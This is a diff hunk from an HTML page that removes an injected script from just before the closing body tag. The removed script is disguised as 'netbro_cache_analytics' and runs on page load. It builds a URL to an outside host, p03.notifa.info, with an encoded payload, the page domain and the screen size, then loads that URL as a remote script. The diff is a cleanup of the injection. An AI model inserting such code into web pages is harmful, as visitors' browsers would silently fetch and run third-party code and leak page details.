@@ -199,7 +199,7 @@
 
 
 
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mxikTLFT%2f8quQr8ropfFLARsTkQ9G%2bNXt7KoAMihhfLzSkeS9DEHYBvqSuSy2Q4Eh3uIgahViAVdbd1KtO6I%2fiL4kI09NcbjNA85DRhy9zFRvLXL2zgnWKVI33eNyiHUch2qJsAmGVxw%2fcA4n2lXyD%2fT00jCc%2bL1ZQDnFJlpBrdIb1dzK17S3NfAn77iigTMLcTtfY2%2fjLFUEYVKaT5yUN2YUOREzQ4esFxEEjGpQGjLVSHRWwzAySFjHnV3i%2bBb0eA4Fm1kSQD4HXYa9TtsS2hUNf5Nq0xdY1Ozos0d7m4XE%2bDIKUxi3zIR4no7y18vNBGoSzvoM07OcSLzEIob7jHXyaYucWya4KvTq%2fXk1qT%2fv4km97W3p2rM16NMsQKxdKOJnBAPXkLDEA8Fop98we5tF%2bCbHt6T49jQPKQx5oj57ecUhMifNZOcoO%2b6lsor2VCYRY0DEMUtR8JxfktyCI60D721En6NQEi9Qf8mriBN5Gt%2bOkfTGaOIes1nWOf04i%2bcUxATlsas%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</body>
 
 
 </html>
